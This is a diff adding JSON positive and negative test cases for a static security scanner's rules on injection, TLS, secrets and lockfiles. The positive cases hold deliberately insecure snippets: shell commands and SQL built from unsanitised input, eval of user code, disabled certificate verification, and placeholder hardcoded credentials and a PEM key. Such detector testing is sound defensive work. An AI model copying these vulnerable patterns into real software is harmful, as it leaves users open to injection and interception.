+   "files": {
+    "k.js": "const map = { accesskey: 'accessKey', password: 'passwordField' };\nconst h = { api_key: 'x-api-key', secret: 'client_secret' };\nconst e = { PWD: '/Users/dev/project' };\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc006-neg-doc-private-key-example",
+   "rule": "SEC-SC-006",
+   "kind": "negative",
+   "note": "documentation example with XXXX body",
+   "files": {
+    "d.js": "const help = 'key=\"-----BEGIN PRIVATE KEY-----\\nXXXX\\nXXXX\\n-----END PRIVATE KEY-----\"';\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc001-neg-published-library",
+   "rule": "SEC-SC-001",
+   "kind": "negative",
+   "note": "published npm library (main/types, not private, no start script)",
+   "files": {
+    "package.json": "{\"name\": \"lib\", \"version\": \"1.0.0\", \"main\": \"index.js\", \"dependencies\": {\"a\": \"^1.0.0\"}}"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc003-neg-husky-with-path",
+   "rule": "SEC-SC-003",
+   "kind": "negative",
+   "note": "husky hook installer with a custom directory",
+   "files": {
+    "package.json": "{\"scripts\": {\"postinstall\": \"husky install .config/husky\"}}"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc001-pos-private-app-with-main",
+   "rule": "SEC-SC-001",
+   "kind": "positive",
+   "note": "private application (has main and start script) without lockfile",
+   "files": {
+    "package.json": "{\n  \"name\": \"app\",\n  \"private\": true,\n  \"main\": \"server.js\",\n  \"scripts\": {\"start\": \"node server.js\"},\n  \"dependencies\": {\"express\": \"^4.0.0\"}\n}\n"
+   },
+   "expect": [
+    [
+     "package.json",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web005-pos-exec-after-long-callback",
+   "rule": "SEC-WEB-005",
+   "kind": "positive",
+   "note": "command built by template literal even when a callback follows",
+   "files": {
+    "z.js": "cp.exec(`convert ${file} out.png`, (err) => {\n  done(err);\n});\n"
+   },
+   "expect": [
+    [
+     "z.js",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web007-pos-reject-unauthorized-key-after-comma",
+   "rule": "SEC-WEB-007",
+   "kind": "positive",
+   "note": "option object key following other options",
+   "files": {
+    "q.js": "https.get({ host: h, path: p, rejectUnauthorized: false }, cb);\n"
+   },
+   "expect": [
+    [
+     "q.js",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web006-pos-lowercase-sql-concat",
+   "rule": "SEC-WEB-006",
+   "kind": "positive",
+   "note": "lowercase SQL with concatenation",
+   "files": {
+    "l.js": "conn.query('select id, name from users where name = \\'' + req.query.n + '\\'');\n"
+   },
+   "expect": [
+    [
+     "l.js",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "sc006-neg-camelcase-straddle-secret",
+   "rule": "SEC-SC-006",
+   "kind": "negative",
+   "note": "'Secret' substring straddling camelCase boundary (kSecReturnAttributes)",
+   "files": {
+    "k2.js": "const kSecReturnAttributes = 'r_Attributes',\n    kSecReturnData = 'r_Data';\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc006-neg-doc-example-url-creds",
+   "rule": "SEC-SC-006",
+   "kind": "negative",
+   "note": "documentation example URL with credentials on example.com; testdata path",
+   "files": {
+    "lib.rs": "/// let url = Url::parse(\"ftp://rms:secret123@example.com\")?;\n",
+    "src/testdata/cases.json": "{\"password\": \"caf%C3%A9\"}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web005-neg-python-def-exec",
+   "rule": "SEC-WEB-005",
+   "kind": "negative",
+   "note": "a method named exec/eval is a definition, not a call",
+   "files": {
+    "hook.py": "class H:\n    def exec(self):\n        return 1\n    def eval(self, x):\n        return x\n",
+    "d.js": "function eval(x) { return x; }\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api005-neg-scanner-config-key",
+   "rule": "SEC-API-005",
+   "kind": "negative",
+   "note": "scanner setting whose name merely ends in introspection",
+   "files": {
+    "burp-config.json": "{\"perform_graphql_introspection\": true, \"run_graphql_playground\": true}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web007-neg-config-gated-opt-out",
+   "rule": "SEC-WEB-007",
+   "kind": "negative",
+   "note": "verification relaxed only inside an explicit ignore-certs option branch",
+   "files": {
+    "net.py": "if cfg.ignore_certs:\n    ctx = ssl.create_default_context()\n    ctx.check_hostname = False\n    ctx.verify_mode = ssl.CERT_NONE\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web003-neg-cargo-profile-debug",
+   "rule": "SEC-WEB-003",
+   "kind": "negative",
+   "note": "Cargo profile debug = true means debug symbols",
+   "files": {
+    "Cargo.toml": "[profile.release]\ndebug = true\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web002-neg-minified-vendor-lib",
+   "rule": "SEC-WEB-002",
+   "kind": "negative",
+   "note": "vendored minified library without .min suffix (few, very long lines)",
+   "files": {
+    "static/shim.js": "(function(a){a.innerHTML=b;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;})(window);\n(function(a){a.innerHTML=b;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;})(window);\n(function(a){a.innerHTML=b;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;})(window);\n(function(a){a.innerHTML=b;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;})(window);\n(function(a){a.innerHTML=b;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;})(window);\n(function(a){a.innerHTML=b;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;})(window);\n(function(a){a.innerHTML=b;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;})(window);\n(function(a){a.innerHTML=b;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;var q=1;})(window);\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc001-neg-rust-lib-without-lib-section",
+   "rule": "SEC-SC-001",
+   "kind": "negative",
+   "note": "library crate detected by src/lib.rs",
+   "files": {
+    "Cargo.toml": "[package]\nname='x'\n[dependencies]\nserde='1'\n",
+    "src/lib.rs": "pub fn f() {}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc001-neg-npm-library-with-files",
+   "rule": "SEC-SC-001",
+   "kind": "negative",
+   "note": "published library marked by files/keywords",
+   "files": {
+    "package.json": "{\"name\": \"lib\", \"files\": [\"dist\"], \"dependencies\": {\"a\": \"^1.0.0\"}}"
+   },
+   "expect": []
+  },
+  {
+   "id": "web005-neg-exec-wrapper-object-arg",
+   "rule": "SEC-WEB-005",
+   "kind": "negative",
+   "note": "exec wrapper taking an options object with argv",
+   "files": {
+    "w.ts": "const r = await exec({ command: 'git', args: [`--git-dir=${dir}`] });\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc006-pos-camelcase-key-still-flagged",
+   "rule": "SEC-SC-006",
+   "kind": "positive",
+   "note": "camelCase compound key names are still credentials",
+   "files": {
+    "cfg.js": "const dbPassword = 'S3cur3Passw0rd!';\nconst clientSecret = 'abcd1234efgh5678ijkl';\n"
+   },
+   "expect": [
+    [
+     "cfg.js",
+     1
+    ],
+    [
+     "cfg.js",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "web007-pos-unconditional-tls-off-near-if",
+   "rule": "SEC-WEB-007",
+   "kind": "positive",
+   "note": "an unrelated if above does not excuse an unconditional disable",
+   "files": {
+    "net2.py": "if debug_logging:\n    print('x')\nctx = ssl.create_default_context()\nctx.check_hostname = False\n"
+   },
+   "expect": [
+    [
+     "net2.py",
+     4
+    ]
+   ]
+  },
+  {
+   "id": "sc001-neg-composer-no-require-or-library",
+   "rule": "SEC-SC-001",
+   "kind": "negative",
+   "note": "composer.json without requirements / declared library",
+   "files": {
+    "a/composer.json": "{\"name\": \"x/y\", \"type\": \"component\"}",
+    "b/composer.json": "{\"name\": \"x/z\", \"type\": \"library\", \"require\": {\"php\": \">=8\"}}"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc001-pos-composer-project",
+   "rule": "SEC-SC-001",
+   "kind": "positive",
+   "note": "composer application with requirements and no lock",
+   "files": {
+    "composer.json": "{\n  \"name\": \"acme/app\",\n  \"require\": {\"laravel/framework\": \"^10.0\"}\n}\n"
+   },
+   "expect": [
+    [
+     "composer.json",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web005-neg-test-file-eval",
+   "rule": "SEC-WEB-005",
+   "kind": "negative",
+   "note": "eval/exec in test modules and with a literal first argument",
+   "files": {
+    "tests/test_repr.py": "assert eval(string, ENV) == expr\n",
+    "ns.py": "exec('from pkg.abc import Q, C', ns)\nexec(\"x = 1\", locals())\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web006-neg-table-identifier-and-test",
+   "rule": "SEC-WEB-006",
+   "kind": "negative",
+   "note": "table-name identifier interpolation (cannot be bound) and test module",
+   "files": {
+    "store.py": "cur.execute(f\"SELECT COUNT(*) FROM {self.table_name}\")\ncur.execute(\"DELETE FROM %s\" % table)\n",
+    "tests/perf.py": "db.execute(\"insert into perf (k) values (%d)\" % (i,))\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web006-neg-title-case-prose",
+   "rule": "SEC-WEB-006",
+   "kind": "negative",
+   "note": "Title-case prose beginning with Select/Update",
+   "files": {
+    "p.js": "const t = 'Select columns from ' + tableName;\nconst u = `Delete from ${where} failed`;\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web006-pos-value-interpolation-with-table-const",
+   "rule": "SEC-WEB-006",
+   "kind": "positive",
+   "note": "identifier whitelist does not excuse a tainted value",
+   "files": {
+    "v.py": "cur.execute(f\"SELECT * FROM {table} WHERE name = '{name}'\")\n"
+   },
+   "expect": [
+    [
+     "v.py",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web007-neg-cert-none-comparison-and-mapping",
+   "rule": "SEC-WEB-007",
+   "kind": "negative",
+   "note": "CERT_NONE used as a comparison or dict key, not assigned",
+   "files": {
+    "m.py": "MAP = {ssl.CERT_NONE: OpenSSL.SSL.VERIFY_NONE}\ncheck = ssl_check_hostname if self.cert_reqs != ssl.CERT_NONE else False\nif mode == ssl.CERT_NONE:\n    pass\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web007-pos-cert-none-argument",
+   "rule": "SEC-WEB-007",
+   "kind": "positive",
+   "note": "CERT_NONE passed as an argument",
+   "files": {
+    "c.py": "tls = Tls(validate=ssl.CERT_NONE, version=3)\nctx.verify_mode = ssl.CERT_NONE\n"
+   },
+   "expect": [
+    [
+     "c.py",
+     1
+    ],
+    [
+     "c.py",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "web008-neg-noqa-and-session-object",
+   "rule": "SEC-WEB-008",
+   "kind": "negative",
+   "note": "explicitly acknowledged md5 (noqa S324); `session` as an HTTP session object, not a token",
+   "files": {
+    "auth.py": "h = hashlib.md5()  # noqa: S324\nh.update(password)\nr = fetch(session, url, proxy=random.choice(proxies))\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web001-neg-cookiejar-api",
+   "rule": "SEC-WEB-001",
+   "kind": "negative",
+   "note": "stdlib CookieJar.set_cookie takes a cookie object, not an HTTP response cookie",
+   "files": {
+    "jar.py": "cj.set_cookie(make_session_cookie(c))\njar.set_cookie(\n    create_auth_cookie(x)\n)\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web003-neg-library-debug-flag",
+   "rule": "SEC-WEB-003",
+   "kind": "negative",
+   "note": "module-level DEBUG flag in a non-web library",
+   "files": {
+    "mylib/core.py": "import os\nDEBUG = True  # perform extra sanity checks\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api004-neg-alg-none-in-message",
+   "rule": "SEC-API-004",
+   "kind": "negative",
+   "note": "alg none mentioned inside an error message string",
+   "files": {
+    "jwtlib.py": "raise InvalidKeyError('When alg = \"none\", key value must be None.')\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc002-neg-prose-named-requirements",
+   "rule": "SEC-SC-002",
+   "kind": "negative",
+   "note": "documentation text that happens to be named requirements.txt",
+   "files": {
+    "help/requirements.txt": "Requirements\n============\n\nThis document describes what is stored in the repository.\nIf this requirement is not present, version 0 is assumed.\n(defined by the ``.hg/sharedpath`` file).\nfncache\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc006-neg-example-usage-and-guid-and-constants",
+   "rule": "SEC-SC-006",
+   "kind": "negative",
+   "note": "help text examples, GUID constants and UPPER_SNAKE names",
+   "files": {
+    "h.py": "help = \"Example: 'smb://TEST\\\\Admin:Passw0rd!1@10.10.10.2'\"\nResetPassword = \"00299570-246d-11d0-a768-00aa006e0529\"\nNBT_SECRET = \"SELECT_SECRET_DOMAIN_6\"\nfmt = \"%s:plain_password_hex:%s\"\nurl = 'redis+cluster://[:password]@host:6379'\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc006-neg-private-key-test-vector",
+   "rule": "SEC-SC-006",
+   "kind": "negative",
+   "note": "PEM key inside a SelfTest/test vector file; AWS docs sample key in examples json",
+   "files": {
+    "pkg/SelfTest/keys.py": "pem = \"\"\"-----BEGIN RSA PRIVATE KEY-----\n",
+    "data/examples-1.json": "{\"AccessKeyId\": \"AKIAIOSFODNN7EXAMPLE\"}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web005-neg-internal-exec-of-compiled-code",
+   "rule": "SEC-WEB-005",
+   "kind": "negative",
+   "note": "template/interpreter library exec of internally compiled code (no request-derived argument)",
+   "files": {
+    "tpl.py": "exec(code, globals_, locals_)\nresult = eval(compiled, namespace)\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web005-pos-exec-of-user-input-variable",
+   "rule": "SEC-WEB-005",
+   "kind": "positive",
+   "note": "exec/eval of an argument named after request input or built dynamically",
+   "files": {
+    "run.py": "exec(user_code)\nval = eval(f\"{a} + {b}\")\n"
+   },
+   "expect": [
+    [
+     "run.py",
+     1
+    ],
+    [
+     "run.py",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "web006-neg-like-pattern-and-quote-name",
+   "rule": "SEC-WEB-006",
+   "kind": "negative",
+   "note": "LIKE '%_X' literal and identifier passed through quote_name",
+   "files": {
+    "q.py": "Q = \"SELECT name FROM sys.users WHERE type LIKE '%_LOGIN' AND x = 1\"\ncur.execute(\"SELECT * FROM %s LIMIT 1\" % self.ops.quote_name(table_name))\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web007-neg-typed-default-comparison-and-noqa",
+   "rule": "SEC-WEB-007",
+   "kind": "negative",
+   "note": "parameter default, equality check, acknowledged suppression, unrelated verify flag",
+   "files": {
+    "srv.py": "def run(ssl_cert_reqs: int = ssl.CERT_NONE):\n    pass\nif opts.get('cert_reqs', ssl.CERT_NONE) != ssl.CERT_NONE:\n    pass\n",
+    "dec.py": "@dispatch(_d, verify=False, module='numpy')\ndef f(): pass\n",
+    "u.py": "yield ssl._create_unverified_context()  # noqa: S323\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web007-neg-raw-docstring",
+   "rule": "SEC-WEB-007",
+   "kind": "negative",
+   "note": "raw docstring describing the insecure option",
+   "files": {
+    "doc.py": "def f():\n    r\"\"\"Options such as\n    ``ssl_options=dict(cert_reqs=ssl.CERT_NONE)`` disable checks.\n    \"\"\"\n    return 1\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web008-neg-hash-of-key-near-password-name",
+   "rule": "SEC-WEB-008",
+   "kind": "negative",
+   "note": "sha1 of a derived key where `password` appears only in the previous line's function name; protocol nonce",
+   "files": {
+    "k.py": "dec, raw = self.decrypt_password(entry.key)\nsha = hashlib.sha1(dec).hexdigest()\nreq['nonce'] = random.getrandbits(31)\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web002-neg-ternary-of-literals",
+   "rule": "SEC-WEB-002",
+   "kind": "negative",
+   "note": "ternary choosing between two literal strings",
+   "files": {
+    "t.js": "el.innerHTML = enabled ? 'on' : 'off';\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc006-neg-comment-docstring-and-type-values",
+   "rule": "SEC-SC-006",
+   "kind": "negative",
+   "note": "examples in comments/docstrings, %(x)s templates, type names, license text",
+   "files": {
+    "d.py": "# url = 'smb://TEST\\\\u:Passw0rd!1@10.0.0.2'\n\"\"\"\nMongoClient(username='u', password='pass/word')\n\"\"\"\nSECRET = \"%(secret)s\"\n",
+    "t.yml": "props:\n  password: string?\n",
+    "ThirdPartyNotices.txt": "password: 'abcdef12345124'\n",
+    "e.cpp": "m = {'PasswordEchoOnEdit': 'QLineEdit::EchoMode::PasswordEchoOnEdit'};\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web002-neg-multiline-literal-concat-and-self-markup",
+   "rule": "SEC-WEB-002",
+   "kind": "negative",
+   "note": "multi-line concatenation of literals only; appending to own markup; string mentioning insertAdjacentHTML()",
+   "files": {
+    "p.js": "this._elt.innerHTML = '<svg>' +\n  '<circle r=\"1\"></circle>' +\n  '</svg>';\ncol.innerHTML = col.innerHTML + '<span class=\"s\"></span>';\nconst doc = 'call insertAdjacentHTML() then stop, ok';\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web002-pos-multiline-concat-with-variable",
+   "rule": "SEC-WEB-002",
+   "kind": "positive",
+   "note": "multi-line concatenation that includes a variable",
+   "files": {
+    "q.js": "box.innerHTML = '<div>' +\n  userName +\n  '</div>';\n"
+   },
+   "expect": [
+    [
+     "q.js",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "sc006-neg-pem-header-constants",
+   "rule": "SEC-SC-006",
+   "kind": "negative",
+   "note": "PEM header used as a parser constant or docs, with no key body",
+   "files": {
+    "ssh.py": "_SK_START = b\"-----BEGIN OPENSSH PRIVATE KEY-----\"\nlines = (\n    [b\"-----BEGIN OPENSSH PRIVATE KEY-----\"]\n    + [b64[i:i + 64] for i in range(0, len(b64), 64)]\n)\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc006-neg-timestamps-urls-and-libnames",
+   "rule": "SEC-SC-006",
+   "kind": "negative",
+   "note": "values that are timestamps, plain URLs, library names or hyphenated words",
+   "files": {
+    "a.json": "{\"PasswordLastUsed\": \"2016-09-08T21:47:36Z\"}\n",
+    "b.py": "_OAUTH_ACCESS_TOKEN_URL = \"https://graph.example.net/oauth/access_token?\"\nuser_password = \"id-at-userPassword\"\nKPASSWD_SPN = \"kadmin/changepw\"\n",
+    "c.js": "const deps = { 'libsecret-1.so.0': 'libsecret-1-0' };\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc006-pos-pem-with-body-and-prefix-name",
+   "rule": "SEC-SC-006",
+   "kind": "positive",
+   "note": "PEM private key header followed by base64 body",
+   "files": {
+    "k.pem": "-----BEGIN PRIVATE KEY-----\nRVhBTVBMRUVYQU1QTEVFWEFNUExFRVhBTVBMRUVYQU1QTEU=\n-----END PRIVATE KEY-----\n"
+   },
+   "expect": [
+    [
+     "k.pem",
+     1
+    ]
+   ]
+  }
+ ]
+}
